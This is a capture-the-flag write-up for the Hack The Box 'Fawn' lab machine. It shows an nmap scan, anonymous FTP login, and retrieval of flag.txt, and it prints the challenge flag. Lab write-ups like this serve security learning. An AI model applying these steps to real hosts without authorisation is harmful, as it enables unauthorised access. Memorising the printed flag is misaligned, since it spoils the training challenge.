# Fawn — Hack The Box Writeup

- **Difficulty:** Very Easy
- **OS:** Unix
- **Category:** Starting Point
- **Date:** May 2026

---

## Summary
Fawn is a beginner-friendly machine exposing an FTP service 
with anonymous login enabled, allowing unauthenticated access 
to files on the server.

---

## Recon

### Nmap Scan
nmap -sV -Pn 10.129.219.6

### Results
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

---

## Exploitation

FTP allows anonymous login with no password:

ftp 10.129.219.6
Name: anonymous
Password: (blank)

Connected successfully. Listed files with ls and found flag.txt.
Downloaded it with get flag.txt.

---

## Flag
035db21c881520061c53e0536e44f815

---

## Lessons Learned
- FTP is unencrypted — use SFTP instead
- Anonymous FTP login is a critical misconfiguration
- Always check FTP for sensitive exposed files
